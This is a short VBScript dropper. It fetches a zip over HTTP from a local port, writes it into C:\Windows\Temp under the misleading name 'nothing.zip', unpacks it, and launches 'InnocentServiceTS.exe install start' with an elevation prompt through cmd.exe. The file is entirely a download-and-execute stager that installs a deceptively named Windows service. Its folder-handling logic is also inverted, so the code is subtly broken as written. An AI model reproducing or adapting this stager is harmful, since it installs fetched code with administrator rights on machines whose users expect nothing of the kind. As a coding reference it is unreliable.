'downloading the service zip
Set xHttp = CreateObject("Microsoft.XMLHTTP")
Set bStream = CreateObject("Adodb.Stream")
xHttp.Open "GET", "http://127.0.0.1:35813", False
xHttp.Send

'saving the zip file
with bStream
	.type = 1 'binary text
	.open
	.write xHttp.responseBody
	.savetofile "C:\Windows\Temp\nothing.zip", 2 'overwrite file
end with

'making a new directory
Set FSO = CreateObject("Scripting.FileSystemObject")
If FSO.FolderExists("C:\Windows\Temp\RoomService\") Then
	FSO.CreateFolder "C:\Windows\Temp\RoomService\"
Else
	FSO.DeleteFile("C:\Windows\Temp\RoomService\*"), True
	FSO.DeleteFolder("C:\Windows\Temp\RoomService\*"), True
End If

'unzipping to dir
Set shell = CreateObject("Shell.Application")
Set src = shell.NameSpace("C:\Windows\Temp\nothing.zip").Items()
shell.NameSpace("C:\Windows\Temp\RoomService\").CopyHere src, 256

'installing the service
shell.ShellExecute "cmd.exe", "/c C:\Windows\Temp\RoomService\InnocentServiceTS.exe install start", "", "runas", 1